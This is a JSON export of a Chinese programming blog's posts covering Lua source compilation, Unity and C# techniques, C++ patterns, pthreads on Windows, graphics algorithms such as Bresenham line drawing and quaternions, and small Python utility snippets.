{"pages":[{"title":"lua源码阅读1——源码编译","text":"下载 lua源码 源码地址：http://www.lua.org/versions.html， 本次阅读使用的版本是5.3.5 将src文件夹导入vs， 我使用的是vs2015。除了lua.c和luac.c全部include进工程。 编译。我的工程地址：https://github.com/shazi129/LuaSourceCode.git 这里是我的测试代码： #include <stdio.h> #include \"./../src/lua.h\" int main () { char lua [] = \"local a = 1 \\n \" \\ \"local b = 2 \\n \" \\ \"print (string.format( \\\" a+b=%d \\\" , a+b))\" ; lua_State * lstate = luaL_newstate (); luaL_openlibs ( lstate ); if ( luaL_loadstring ( lstate , lua ) || lua_pcall ( lstate , 0 , 0 , 0 )) { printf ( \"error: %s \\n \" , lua_tostring ( lstate , - 1 )); } lua_close ( lstate ); system ( \"pause\" ); return 0 ; }","tags":"lua源码阅读","url":"http://www.vmetu.com/blog/luayuan-ma-yue-du-1-yuan-ma-bian-yi.html"},{"title":"一种利用C# Attribute实现数据的绑定","text":"一种利用C# Attribute实现数据的绑定 在日常开发中，经常会有数据和UI绑定的需求，即数据发生改变时，UI要随之改变。这里提供一个简单的思路，目的是尽量减少代码的编写。 ModelBase 数据存储基类 using System.Collections; using System; using System.Reflection; using System.Collections.Generic; [AttributeUsage(AttributeTargets.Property, Inherited = false)] public class ObservableName : Attribute { public string name = String.Empty; public ObservableName(string bindName) { name = bindName; } } public class ModelBase { public class ModelBindingInfo { public PropertyInfo propertyInfo = null; public ArrayList callbacks = new ArrayList(); } private Dictionary<string, ModelBase.ModelBindingInfo> _bindingTable = new Dictionary<string, ModelBase.ModelBindingInfo>(); public ModelBase() { collectObservableProperty(); } private void collectObservableProperty() { _bindingTable.Clear(); Type type = this.GetType(); PropertyInfo[] propertyInfos = type.GetProperties(); for (int i = 0; i < propertyInfos.Length; i++) { object[] obs = propertyInfos[i].GetCustomAttributes(false); for (int j = 0; j < obs.Length; j++) { ObservableName obName = obs[j] as ObservableName; if (obName != null && !_bindingTable.ContainsKey(obName.name)) { ModelBase.ModelBindingInfo bindingInfo = new ModelBase.ModelBindingInfo(); bindingInfo.propertyInfo = propertyInfos[i]; _bindingTable[obName.name] = bindingInfo; } } } } public void addObserverBinding<T>(string obName, Action<T> cb) { if (_bindingTable.ContainsKey(obName)) { _bindingTable[obName].callbacks.Add(cb); } } public void removeObserverBinding<T>(string obName, Action<T> cb) { if (_bindingTable.ContainsKey(obName)) { ArrayList callbacks = _bindingTable[obName].callbacks; callbacks.Remove(cb); } } public void setObservableData<T>(string obName, T data) { if (!_bindingTable.ContainsKey(obName)) { return; } ModelBindingInfo bindingInfo = _bindingTable[obName]; bindingInfo.propertyInfo.SetValue(this, data, null); T newData = (T)bindingInfo.propertyInfo.GetValue(this, null); //通知 ArrayList callbacks = _bindingTable[obName].callbacks; for (int j = 0; j < callbacks.Count; j++) { Action<T> cb = (Action<T>)callbacks[j]; cb(newData); } } } 使用： 如果model中的某个property要被绑定，那么就加上 ObservableName 的属性，指定绑定的key， 然后就可以通过 addObserverBinding 来绑定行为了。 class Person : ModelBase { [ ObservableName ( \"address\" ) ] public string address { get ; set ; } } class Test { public void testAttribute() { Person zhangwen = new Person() ; zhangwen.addObserverBinding<string>(\"address\", onZhangwenAddrChange) ; Person shazi = new Person() ; shazi.addObserverBinding<string>(\"address\", onShaziAddrChange) ; zhangwen.setObservableData(\"address\", \"caifugang\") ; shazi.setObservableData(\"address\", \"baijin\") ; } private void onShaziAddrChange ( string obj ) { Console.WriteLine(\"shazi's addr changed, new addr : \" + obj); } private void onZhangwenAddrChange(string obj) { Console.WriteLine(\" zhangwen ' s addr changed , new addr : \" + obj ); } static void Main ( string [] args ) { TestAttribute test = new TestAttribute() ; test.testAttribute() ; Console.ReadKey() ; } }","tags":"编程语言","url":"http://www.vmetu.com/blog/yi-chong-li-yong-c-attributeshi-xian-shu-ju-de-bang-ding.html"},{"title":"USheet API说明","text":"USheet API 说明 [TOC] 最新源码： https://github.com/shazi129/USheet.git 名字空间：USheet 注意： 如果需要使修改后的数据落地，需要调用 EditorUtility.SetDirty(sheetData); 查询相关 根据表的内容查找行号 int indexOf<T>(string title, T value, int startIndex = 0) 参数： title: 索引列的表头 Value: 索引列的值 startIndex: 查找的起始行号 返回： 从0开始的行号 查找某个单元格的内容 IGridData getValue<T>(string keyName, T keyValue, string title, int index = 0) 参数： keyName: 索引列的表头 keyValue: 索引列的值 title: 单元格所在的列表头 index : 查找的起始行号 返回： 单元格内容结构体，没查到返回null 查找所有符合条件的行 List<Dictionary<string, IGridData>> getRows<T>(string keyName, T keyValue) 参数： keyName: 索引列的表头 keyValue: 索引列的值 返回： 所有的行内容，没查到返回null。其中 Dictionary<string, IGridData> 代表一行的内容，key为列名， IGridData为数据 根据行号获取行内容 Dictionary<string, IGridData> getRow(int index) 参数： index: 行号 返回： 所有的行内容，没查到返回null。在返回的Dictionary中，key为列名， IGridData为数据 删除相关 删除一列 void deleteColumn(string columnName) 参数： columnName: 列名 删除一行 void deleteRow(int index = -1) 参数： index : 行号，小于0时删除最后一行 修改相关 修改单元格数据 void modify(string title, int rowIndex, IGridData iData) 参数： title: 列名 rowIndex: 行号 iData: 需要修改成的数据 修改列名 void modifyColumnName(string oldName, string newName) 参数： oldName: 要修改的列名 newName: 新的列名","tags":"编程语言","url":"http://www.vmetu.com/blog/usheet-apishuo-ming.html"},{"title":"使用ScriptableObject序列化Unity Object","text":"在Unity中，Unity Object的序列化必须依赖GameObject。像这样是不行的： [ Serializable ] class ObjectSheetData : SheetData { public Object data = null ; } ObjectSheetData objData = new ObjectSheetData (); objData . data = 某个 Sprite ; //序列化到data.byte BinaryFormatter formatter = new BinaryFormatter (); Stream stream = new FileStream ( \"data.byte\" , FileMode . Create , FileAccess . Write , FileShare . None ); formatter . Serialize ( stream , objData ); stream . Close (); Unity会提示 SerializationException: Type UnityEngine.Sprite is not marked as Serializable. 通常的做法是将要序列化的数据附加到一个GameObject上，然后将GameObject做成Prefab，在要使用数据的地方引用Prefab就可以了。这里提供一个算是比较通用的 脚本 ，用来实现类似表的功能。 但我们发现这是一种 数据附加到界面上来存储 的方式，有违 界面与数据分离 的设计方式。 ScriptableObject 提供了一种不依赖 GameObject 的序列化数据的方式。 我们可以将数据封装成这样： public class ScriptableData : ScriptableObject { public string myName = \"\"; public int myLevel = 0; public Sprite myIcon = null; } 提供一个创建数据文件的接口： [MenuItem(\"ScriptableTest/CreateData\")] public static void CallFunc() { ScriptableData data = ScriptableObject.CreateInstance<ScriptableData>(); data.myName = \"\"; data.myLevel = 0; data.myIcon = null; //ScriptableDataPaht是数据文件的路径 AssetDatabase.CreateAsset(data, GlobalValue.ScriptableDataPaht); AssetDatabase.SaveAssets(); } 创建出来的文件是这样子的： 填上数据后，就可以在运行时读取了： ScriptableData _data = AssetDatabase.LoadAssetAtPath<ScriptableData>(GlobalValue.ScriptableDataPaht); nameInput.text = _data.myName; levelInput.text = _data.myLevel.ToString(); image.sprite = _data.myIcon;","tags":"Unity","url":"http://www.vmetu.com/blog/shi-yong-scriptableobjectxu-lie-hua-unity-object.html"},{"title":"Unity Editor 自定义窗口","text":"[TOC] Unity 提供 EditorWindow 给开发者使得开发者可以创建自定义的编辑器界面，像这样的： 下面来深入了解一下。 示例代码 public class MyWindow : EditorWindow { [ MenuItem ( \"Window/MyWindow\" )] static void myWindow () //创建自定义窗口 { MyWindow window = ( MyWindow ) EditorWindow . GetWindow ( typeof ( MyWindow )); window . Show (); } private void OnGUI () //构建界面 { string focuseName = focusedWindow == null ? \"Nothing\" : focusedWindow . ToString (); string overName = mouseOverWindow == null ? \"Nothing\" : mouseOverWindow . ToString (); GUILayout . Label ( \"Focus Win:\" + focuseName + \", Mouse over:\" + overName ); } void OnInspectorUpdate () //实时更新 { this . Repaint (); } } API解析 GetWindow 函数原型： public static EditorWindow GetWindow ( Type t , bool utility = false , string title = null , bool focus = true ); 这个函数的作用是返回当前Uinty界面上的第一个类型为 t 的窗口，如果没有，创建并返回。 参数utility如果为true，那么这个窗口始终是一个浮动窗口，不会和其他窗口组合。 OnGUI() 自定义窗口的UI实现 focusedWindow 和 mouseOverWindow 这是EditorWindow中的两个自定义变量： public static EditorWindow mouseOverWindow; public static EditorWindow focusedWindow; 表示当前Unity界面中，焦点窗口和鼠标Over窗口，可为Null。 OnInspectorUpdate() 这个函数每秒会被调用10次，用来实时更新自定义窗口的信息。 在我们的示例程序中，因为要实时监听鼠标的Over事件和窗口的focus事件，所以需要这个函数。 Repaint 重新绘制窗口","tags":"计算机图形学","url":"http://www.vmetu.com/blog/unity-editor-zi-ding-yi-chuang-kou.html"},{"title":"一些Unity控件","text":"tab控件 用于快速生成有tab页的界面，可动态生成 id-object的map 经常用于在程序中配置id和图片的对应关系 MoveForSpecialDev 用于不同设备的界面元素位置的微调，目前仅用于iPhoneX的适配","tags":"Unity","url":"http://www.vmetu.com/blog/yi-xie-unitykong-jian.html"},{"title":"Unity下C#与Java的交互(一)","text":"[TOC] 这种情况主要发生在Unity要使用Android代码的情况下。Unity提供的方式是将用到的Android代码打成jar文件，放到Unity的plugins文件中，然后使用。 示例用到的是utils.jar 1. 创建Android工程 创建一个Android工程，并导入Unity提供的jar，下面是我的示例： 其中， com.zw.utils 是要导出的包， com.zw.unity_test 是我用来测试jar包的代码，class.jar是导入的unity提供的jar包。 2. 编写java代码并导出 这里先实现一个小功能： public class Utils { public static int addOne ( int a ){ return a + 1 ; } } 右击 com.zw.utils 导出jar： 并将utils.jar放到Unity的 Asset/Plugins/Android/bin 目录下 3. 编写C#代码 public class TestAndroid : MonoBehaviour { private Button selfBtn ; public Text selfText ; public Text outText ; private int a = 0 ; // Use this for initialization void Start () { selfBtn = gameObject . GetComponent < Button >(); selfBtn . onClick . AddListener ( onSelfBtnClick ); } private void onSelfBtnClick () { try { # if UNITY_ANDROID AndroidJavaClass jClass = new AndroidJavaClass ( \"com.zw.utils.Utils\" ); a = jClass . CallStatic < int >( \"addOne\" , a ); # endif selfText . text = \"\" + a ; } catch ( Exception e ) { outText . text = e . ToString (); } } } Unity界面 button上的text显示java代码返回的结果，另一个text显示错误信息。 打Android包运行 更改AndroidManifest 当我们在android中加入了一些需要权限的代码，例如读取sd卡数据。有两种方法，一是在Unity的Player Setting中设置这个： 二是更改AndroidManifest.xml Unity在打apk包时，会以： 为模版来修改，那我们要做的，就是将这个xml复制到 Asset/Plugins/Android/ 下，然后加入权限申明就可以了。 其他略","tags":"编程语言","url":"http://www.vmetu.com/blog/unityxia-cyu-javade-jiao-hu-yi.html"},{"title":"Unity Shader 学习笔记1 —— 第一个Shader","text":"Unity Shader 学习笔记1—— 第一个Shader @(计算机图形学)[学习笔记, Unity, shader] [TOC] Shader结构 Properties 示例： Properties{ _Color(\"Color Tint\", Color) = (1.0, 1.0, 1.0, 1.0) _Offset(\"Offset\", Vector) = (0, 0, 0, 0) } 类似于定义变量。例如_Color一行的含义为：Shader中有个 _Color 的变量，它的类型是 Color , 值由编辑器中的 Color Tint 来编辑。效果： SubShader 和 Fallback SubShader是Unity Shader用来支持不同显卡的方式。当Unity加载一个Shader时，会从这个Shader中选取第一个可以支持的SubShader加载，如果都不支持，使用FallBack指定的Shader SubShader中每个渲染流程可以用Pass包起来，一个SubShader中可以有多个渲染流程 一个示例 Shader \"Custom/1_shader\" { Properties{ _Color(\"Color Tint\", Color) = (1.0, 1.0, 1.0, 1.0) _Offset(\"Offset\", Vector) = (0, 0, 0, 0) } SubShader{ Pass { CGPROGRAM //定义顶点着色器和片元着色器的代码 #pragma vertex vert #pragma fragment frag fixed4 _Color; fixed4 _Offset; float4 vert(float4 v : POSITION) : SV_POSITION { //意思是将模型空间中的点转换为剪裁空间（屏幕）中的点，然后加上offset return UnityObjectToClipPos(v) + _Offset; } fixed4 frag() : SV_Target { return _Color; } ENDCG } } } 使用 创建shader文件 在Unity Project中右击，选择 Create->Shader->Standard Surface Shader ，创建完成后改名，然后将自己的代码替换掉原来的代码。 创建Meterial 创建后，将Shader设为自己的Shader MeshRender使用 创建一个GameObject, 增加MeshRender组件，将材质设为刚才创建的材质，就可以看到效果了","tags":"计算机图形学","url":"http://www.vmetu.com/blog/unity-shader-xue-xi-bi-ji-1-di-yi-ge-shader.html"},{"title":"一个C++实现类似反射的工厂模式","text":"@(编程语言)[C/C++] 目的：使用C++实现一个有类似反射功能的工厂类 头文件： #include <iostream> #include <string> #include <map> using namespace std ; class Base { public : virtual void print () { cout << \"this is class Base\" << endl ;} }; class DeriveA : public Base { public : virtual void print () { cout << \"this is class DeriveA\" << endl ;} }; class DeriveB : public Base { public : virtual void print () { cout << \"this is class DeriveB\" << endl ;} }; class Factory { public : static Factory * shareInstance (); ~ Factory (); template < typename T > T * getClass () { string keyName = string ( typeid ( T ). name ()); map < string , Base *>:: iterator iter = mClassMap . find ( keyName ); if ( iter != mClassMap . end ()) { T * retObj = dynamic_cast < T *> ( iter -> second ); if ( retObj ) { return retObj ; } } T * retObj = new T (); addClass ( keyName , retObj ); return retObj ; } private : Factory (); void addClass ( const string & key , Base * baseClass ); private : map < string , Base *> mClassMap ; }; 源文件 Factory :: Factory (){} Factory ::~ Factory (){} Factory * Factory :: shareInstance () { static Factory factory ; return & factory ; } void Factory :: addClass ( const string & key , Base * baseClass ) { map < string , Base *>:: iterator iter = mClassMap . find ( key ); if ( iter != mClassMap . end ()) { delete ( iter -> second ); mClassMap . erase ( iter ); } mClassMap [ key ] = baseClass ; } int main ( int argc , char ** argv ) { Factory :: shareInstance () -> getClass < DeriveA > () -> print (); Factory :: shareInstance () -> getClass < DeriveB > () -> print (); return 0 ; }","tags":"编程语言","url":"http://www.vmetu.com/blog/yi-ge-cshi-xian-lei-si-fan-she-de-gong-han-mo-shi.html"},{"title":"C++中未使用虚析构函数导致的内存泄漏","text":"代码 #include <vector> #include <iostream> #include \"vld.h\" using namespace std ; class Base { public : Base (){} ~ Base () { cout << \"Base Destructor\" << endl ; } }; class Derive : public Base { public : Derive () { vecInt . push_back ( 0 ); vecInt . push_back ( 2 ); } ~ Derive () { cout << \"Derive Destructor\" << endl ; } vector < int > vecInt ; }; int main ( int argc , char ** argv ) { Base * a = new Derive (); delete a ; return 0 ; } vld内存检查： Leak Hash: 0xFF7D4793, Count: 1, Total 8 bytes Call Stack (TID 7516): MSVCR100D.dll!operator new() e:\\program files (x86)\\microsoft visual studio 10.0\\vc\\include\\xmemory (36): TestPrj.exe!std::_Allocate () + 0x15 bytes e:\\program files (x86)\\microsoft visual studio 10.0\\vc\\include\\xmemory (187): TestPrj.exe!std::allocator ::allocate() + 0xB bytes e:\\program files (x86)\\microsoft visual studio 10.0\\vc\\include\\vector (442): TestPrj.exe!std::_Vector_val >::_Vector_val >() + 0xA bytes e:\\program files (x86)\\microsoft visual studio 10.0\\vc\\include\\vector (508): TestPrj.exe!std::vector >::vector >() f:\\workspace\\testprj\\testprj\\singletest\\virtualdestructor.cpp (25): TestPrj.exe!Derive::Derive() + 0x59 bytes f:\\workspace\\testprj\\testprj\\singletest\\virtualdestructor.cpp (40): TestPrj.exe!test_interface() + 0x2B bytes f:\\workspace\\testprj\\testprj\\main.cpp (6): TestPrj.exe!main() + 0xD bytes f:\\dd\\vctools\\crt_bld\\self_x86\\crt\\src\\crtexe.c (555): TestPrj.exe!__tmainCRTStartup() + 0x19 bytes f:\\dd\\vctools\\crt_bld\\self_x86\\crt\\src\\crtexe.c (371): TestPrj.exe!mainCRTStartup() kernel32.dll!BaseThreadInitThunk() + 0x12 bytes ntdll.dll!RtlInitializeExceptionChain() + 0x63 bytes ntdll.dll!RtlInitializeExceptionChain() + 0x36 bytes Data: D8 4C 48 00 00 00 00 00 .LH..... ........ 因为基类的析构函数没有加virtual，delete的时候只会释放基类声明的内存块，子类的成员变量占用的内存就忽略了，导致内存泄漏。","tags":"编程语言","url":"http://www.vmetu.com/blog/czhong-wei-shi-yong-xu-xi-gou-han-shu-dao-zhi-de-nei-cun-xie-lou.html"},{"title":"Windows下使用pthreads库","text":"环境搭建 下载phtreads库： ftp://sourceware.org/pub/pthreads-win32/pthreads-w32-2-9-1-release.zip 使用 Pre-built.2/include 作为头文件引用 使用 Pre-built.2/lib/x86/pthreadVC2.lib 做为库文件引用 将 Pre-built.2/dll/x86/pthreadVC2.dll 考到生成exe的目录 测试代码： #include \"pthread.h\" #include <iostream> using namespace std ; void * Function_t ( void * Param ) { pthread_t myid = pthread_self (); cout << \"线程ID:\" << myid . x << endl ; return NULL ; } int test_interface ( int argc , char ** argv ) { pthread_t pid ; pthread_attr_t attr ; pthread_attr_init ( & attr ); pthread_attr_setscope ( & attr , PTHREAD_SCOPE_PROCESS ); pthread_attr_setdetachstate ( & attr , PTHREAD_CREATE_DETACHED ); cout << \"创建线程\" << endl ; pthread_create ( & pid , & attr , Function_t , NULL ); getchar (); pthread_attr_destroy ( & attr ); return 0 ; }","tags":"编程语言","url":"http://www.vmetu.com/blog/windowsxia-shi-yong-pthreadsku.html"},{"title":"计算机图形学笔记——画直线算法","text":"计算机图形学笔记——画直线算法 @(计算机图形学)[学习笔记] [TOC] 画线算法主要用来解决如下问题：对于某个直线方程，已知起点重点，计算机如何绘制出这个线段。计算机绘制线段其实就是绘制一系列的像素点。 DDA算法 思路: 对于直线方程$y = kx + b$， 在一个坐标轴以单位长度步进，并计算得到另一坐标轴的步进，之后根据起点+步进得到一个点的坐标，这个点就是需要绘制的点。为了保证绘制的精度，选择步进较大的坐标轴为基础坐标轴，例如每次步进$\\Delta x > \\Delta y $, 那么以x轴为单位长度步进的坐标轴。 实现代码： //四舍五入 inline int round ( float a ) { return int ( a + 0.5f )} void lineDDA ( int startX , int startY , int endX , int endY ) { float dx = endX - startX ; float dy = endY - startY ; float steps = fabs ( dx ) > fabs ( dy ) ? fabs ( dx ) : fabs ( dy ); float incX = dx / steps ; float incY = dy / steps ; for ( int i = 0 ; i <= steps ; i ++ ) { float newX = ( float ) startX + ( float )( i ) * incX ; float newY = ( float ) startY + ( float )( i ) * incY ; drawPixel ( round ( newX ), round ( newY )); //画像素点 } } 通过代码也可以看到，运算使用了浮点运算,取整，不利于用硬件实现。 Bresenham算法 同DDA算法一样选择步进坐标轴，我们假设步进坐标轴为$x$轴，即斜率 $|k| < 1$, 因为绘制的像素点坐标必须是整数， 那么对于$(x_n, y_n)$的下一个点$(x_{n+1}, y_{n+1})$，有$x_{n+1} = x_n + 1$, $y_{n+1} < 1$ , 该点绘制的像素坐标会是$(x_n + 1, y_n)$， $(x_n + 1, y_n+1)$中的一个。 每次绘制下一个点时，我们期望有这样一个变量$p_n$, 如果$p_n > 0$下一个点的坐标为 $(x_n + 1, y_n+1)$，否则下一个点的坐标为$(x_n + 1, y_n)$。 我们期望绘制的像素点离实际的坐标点距离越小越好，那么两个候选的像素坐标到实际坐标的距离分别为： $d_{upper}$ = $y_n+1 - y_{n+1}$ $d_{lower}$ = $y_{n+1} - y_n$ 对于直线方程$y = kx + b$： $\\Delta d = d_{lower} - d_{upper} = 2y_{n+1} - 2y_n -1 = 2(kx_{n+1} + b) - 2y_n -1$ 其中$x_{n+1} = x_n + 1$, 推导可得： $\\Delta d = 2(kx_n - y_n) + 2k + 2b - 1$ 注意： 不能再继续用$y_n = kx_n + b$代如上式推导下去了，因为点$(x_n, y_n)$不一定 精确地 在直线上。 如果$\\Delta d > 0$, 那么下个点取$(x_n + 1, y_n+1)$会准确一些，反之亦然，但$\\Delta d$还不能作为变量$p_n$使用，因为计算还存在浮点运算和除法。 到这一步的式子中，为了消除$k$这个存在除法运算的变量，我们可以用$k = \\frac{X_{end} - X_{start}}{ Y_{end} - Y_{start}} = \\frac{\\Delta y}{\\Delta x}$ 代如上式, 然后等式两边同时乘以$\\Delta x$可得： $\\Delta x \\Delta d = 2(\\Delta y x_n - \\Delta x y_n) + 2\\Delta y + 2b\\Delta x - \\Delta x = 2(\\Delta y x_n - \\Delta x y_n) + c$ 因为$\\Delta x$在我们的设定中始终大于0， 这样我们就得到了需要的变量$p_n = \\Delta x \\Delta d$，计算该变量无需浮点运算和除法。 进一步，我们可以通过$p_n$ 和$p_{n+1}$的关系来继续简化运算： $p_{n+1} - p_n = 2(\\Delta y(x_{n+1} - x_n) - \\Delta x(y_{n+1} - y_n)) = 2(\\Delta y - \\Delta x(y_{n+1} - y_n))$ 得到： $$p_{n+1} = \\begin{cases} p_n + 2\\Delta y &\\mbox{$p_n \\leq 0$} \\ p_n + 2(\\Delta y - \\Delta x) &\\mbox{$p_n > 0$} \\end{cases}$$ 其中： $p_0 = 2(\\Delta y x_n - \\Delta x y_n) + c = 2(\\Delta y x_n - \\Delta x (\\frac{\\Delta y}{\\Delta x} x_0 + b)) + c = 2\\Delta y - \\Delta x$ 下面给出斜率$|k| < 1$的代码： void lineBresenham ( int startX , int startY , int endX , int endY ) { int x = startX ; int y = startY ; if ( x > endX ) //保证dx > 0 { x = endX ; endX = startX ; y = endY ; endY = startY ; } int dx = endX - x ; int dy = endY - y ; int p = 2 * dy - dx ; drawPixel ( x , y ); while ( x < endX ) { x ++ ; if ( p > 0 ) { y ++ ; p += 2 * ( dy - dx ); } else { p += 2 * dy ; } drawPixel ( x , y ); } } 当$|k|>1$时，选择y方向的步进即可，对于一些特殊斜率，如0， 1， 无穷大，直接使用特殊处理会更简单。","tags":"计算机图形学","url":"http://www.vmetu.com/blog/ji-suan-ji-tu-xing-xue-bi-ji-hua-zhi-xian-suan-fa.html"},{"title":"计算机图形学笔记——矩阵","text":"计算机图形学笔记——矩阵 @(计算机图形学)[学习笔记] [TOC] 在游戏编程过程中，如果要操作一个物体，我们会使用各种矩阵。下面来说一下这些矩阵是如何起作用的。 矩阵与坐标变换 在图像的绘制过程中，矩阵主要是用来进行坐标变换。我们先来看下面的推导。 要得到任意 坐标系1 中的某个点[a, b, c]，可以让原点先在x轴位移[a, 0, 0], 再在y轴上位移[0, b, 0]，最后在z轴上位移[0, 0, c]。将这三个方向的单位向量定义为$p,q,r$, 可以得到推导中的(1)。 p,q,r是 坐标系2 中的某个向量，如推导中的(2) 计算后得到推导结果(4)，该结果就是 坐标系1 中的向量[a, b, c]在 坐标系2 中的表示 从最终的结果可以看出，将一个 坐标系1 中的向量变换到 坐标系2 中，只需要 右乘一个矩阵 即可。再看这个矩阵的内容，我们发现它的每一行就是 坐标系1 中的坐标轴方向的 单位向量 在 坐标系2 中的表示。 在二维笛卡尔坐标系下来看一下实例： 对于 物体坐标系 ，它的坐标轴的单位向量在 世界坐标系 中分别为：p=[2, 1], q=[-1, 2]： 那么对于物体坐标系中的某个点[1, 1]，变换到世界坐标系中为： $$\\begin{bmatrix} 1 & 1 \\end{bmatrix} \\begin{bmatrix} 2 & 1 \\ -1 & 2 \\end{bmatrix} = \\begin{bmatrix} 1 & 3 \\end{bmatrix}$$ 我们发现，从 物体坐标系 到 世界坐标系 的变换，是 物体坐标系 进行了 缩小 ，和 顺时针旋转 ， 但对于绘制出来的图像对于 世界坐标系 却是 放大 和 逆时针旋转 。在计算机绘制图形的时候，就是通过变换坐标系来进行图像的 缩放 和 旋转 的。 矩阵变换的应用 计算时，可以通过预先得出的变换矩阵来使流程简化。下面列一下各种变换矩阵。 缩放 二维与三维的缩放矩阵： 其中n为缩放方向，k为缩放因子。 旋转 二维坐标系中的绕圆心旋转和三维坐标系中绕某个向量旋转 正交投影 投影其实就是缩放。向某个平面投影，就是物体在该平面的法向量上的缩放为0。 镜像 镜像也是缩放。物体对于某个平面的镜像，就是该物品在平面法向量上的缩放为-1。例如在Unity2D中，如果将某个精灵的轴的缩放设为-1，那么会得到一个镜像精灵。 平移与齐次坐标 从上面的内容可知，将某一个向量平移，可以加上一个矩阵；将一个物体缩放或旋转，可以右乘一个矩阵： $p_1 = pM_1 + M_2$ 其中M1是缩放旋转矩阵，M2是位移矩阵。如果经过多次这样的变换的话，会产生很多的代数项，齐次坐标就是用来解决这个问题的。 所谓齐次坐标就是用n+1个分量来表示n维坐标。例如：二维平面上的点$A(x , y)$用齐次坐标表示为$(h_x , h_y , h)$；三维空间中的点$B(x , y , z)$用齐次坐标表示为$(h_x , h_y , h_z , h)$。一个向量的齐次表示并不是唯一的，齐次坐标中的h取不同值表示的都是同一个点，比如$(8 , 4 , 2)$、$(4 , 2 , 1)$表示的都是二维平面上的点$(4 , 2)$。下面来看一个等式： $$\\begin{bmatrix} x & y & z & 1 \\end{bmatrix} \\begin{bmatrix} 1 & 0 & 0 & 0 \\ 0 & 1 & 0 & 0 \\ 0 & 0 & 1 & 0 \\ a & b & c & 1\\end{bmatrix} = \\begin{bmatrix} x+a & y+b & z+c & 1 \\end{bmatrix}$$ 可以看出，一个点的位移，可以用齐次坐标的右乘来表示。 矩阵的缺点 不直观 数据冗余 大量矩阵相乘容易产生坏数据 欧拉角 在三维坐标系中，要转动某个物体，可以通过依次绕其各个轴旋转来实现。那么表示一个物体的方位，就可以通过这三个角来表示。 欧拉角表示的是物体的最终方位而不是旋转过程。例如我们说将一个物体旋转到$(ψ, θ, φ)$，这个方位是相对于物体 未旋转 时的角度，而 不是 将当前物体绕z轴旋转ψ， 绕x轴旋转θ， 绕y轴旋转φ。 万向节运动 因为用欧拉角表示方位与旋转的次序无关。unity中默认的是z-x-y，这样的次序就导致了z轴的旋转会影响x,y轴的旋转，x轴的旋转会影响y轴的旋转。 这样的旋转类似于万向节的运动。 万向锁 假设物体按heading-pitch-bank的方式旋转，例如在下面的 示例 中，绿色圈代表y轴的旋转，红色圈代表x轴的旋转，蓝色轴代表z轴的旋转。初始状态如下图： 当绕x轴旋转90度时，发现此时的z轴和以前y轴重合了。 这就意味着，最开始的y轴旋转和此时的z轴旋转是等效的，z轴的旋转可以通过y轴的旋转来实现，可以被认为是无效的。那么欧拉角就损失了一个维度。例如在Unity 3D中： 方位一致 插值计算 欧拉角对计算物体旋转差值产生影响。以Unity3D为例。 假如一个物体的初始方位为（90， 0， 0）， 要旋转到（0， 90， 90） 直观上看，就是将HelloWord立起来。但却有三个坐标轴做了旋转，通过分析其中的插值可以看到，它运动的路径和我们期望的路径并不一样。 计算错误的原因：因为是以万向节的形式旋转，物体旋转到某个位置，有可能需要同时旋转两个或三个坐标轴。此时真正的球面差值和欧拉角的差值不同。旋转依赖的参数太多。 复数与旋转 要解决差值问题，还是要减少旋转依赖的参数。但矩阵的数据太冗余，好在数学家们发现如下规律： 对于复数： $ p = x + yi $ $ q = cosθ + i sinθ$ $ pq = (x + yi)(cosθ + isinθ) = (xcosθ - ysinθ) + (xsinθ+ ycosθ)i $ 这对于上面的旋转矩阵是不是很像？只要将复数的实部和虚部看做坐标轴，那么 p 可以看做一个向量，pq就可以看p成旋转θ角之后的向量。 四元数 相对于二维坐标中的复数，数学家还定义了三维坐标中的四元数： $p = w + xi + yj + zk$ 其中： $i&#94;2 = j&#94;2 = k&#94;2 = -1$ $ij = k, ji = -k$ $jk = i, kj = -i$ $ki = j, ik = -j$ 设四元数： $ q = [cos(\\theta /2), nsin(\\theta/2)] = [cos(\\theta/2), ({n} {x}sin(\\theta/2), {n} sin(\\theta/2), {n}_{z}sin(\\theta/2))]$ 对于任意四元数： $ p = [w, (x, y, z)]$ 那么对于等式： $ p' = qpq&#94;{-1} = [cos(\\theta /2), nsin(\\theta/2)][w, (x, y, z)][cos(\\theta /2), -nsin(\\theta/2)]$ 展开后可以得到类似于三维旋转矩阵的东西。这说明四元数可以用在物体的旋转计算中。","tags":"计算机图形学","url":"http://www.vmetu.com/blog/ji-suan-ji-tu-xing-xue-bi-ji-ju-zhen.html"},{"title":"python代码段","text":"Python代码段 [TOC] 下面总结一些日常Python代码段 遍历文件夹 1 2 3 4 5 6 7 8 9 10 11 import os def getAllFile ( dirPath ): ret = [] allsub = os . listdir ( dirPath ) for sub in allsub : subPath = \" %s / %s \" % ( dirPath , sub ) if os . path . isfile ( subPath ): ret . append ( subPath ) if os . path . isdir ( subPath ): ret . extend ( getAllFile ( subPath )) return ret 打zip包 1 2 3 4 5 6 import zipfile , os zipPakFile = zipfile . ZipFile ( zipflieName , 'w' , zipfile . ZIP_DEFLATED ) for item in fileList : zipPakFile . write ( item ) zipPakFile . close () 删除文件夹 1 2 3 import shutil #True表示即使为空也强制删除，如果不加True, 只能删除空文件夹 shutil . rmtree ( dirPath , True ) 创建文件夹 1 2 3 if not os . path . isdir ( dir ): #makedirs和mkdir的区别是，如果父目录不存在，makedirs会创建父目录，而mkdir不会 os . makedirs ( dir ) 拷贝文件 1 2 3 4 import os import shutil imageName = os . path . basename ( image ) shutil . copy ( image , \" %s / %s \" % ( pelicanconf . OUTPUT_PATH , imageName )) 按编码转换字符串 def decode_bytes ( byte_str , encoding ): if len ( encoding ) > 0 : return byte_str . decode ( encoding ) else : return byte_str 运行命令 #encoding 为输出格式 def execute_cmd ( cmd , encoding = \"\" ): print ( cmd ) pipe = subprocess . Popen ( cmd , shell = True , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) #实时读出一些数据 while pipe . poll () == None : line_byte = pipe . stdout . readline () print ( decode_bytes ( line_byte , encoding ), end = \"\" ); out = pipe . stdout . read () if len ( out ) > 0 : print ( decode_bytes ( out , encoding ), end = \"\" ); err = pipe . stderr . read () if len ( err ) > 0 : raise Exception ( \"execute cmd error:\" , decode_bytes ( err , encoding ))","tags":"编程语言","url":"http://www.vmetu.com/blog/pythondai-ma-duan.html"},{"title":"glScissor函数","text":"glScissor函数用来剪裁一个绘制区域，比如只要展示纹理的一部分，示例： void myDisplay(void) { glEnable(GL_SCISSOR_TEST); glScissor(50, 50, 50, 50); glClear(GL_COLOR_BUFFER_BIT); glRectf(0, 0, 200, 200); glFlush(); glDisable(GL_SCISSOR_TEST); } 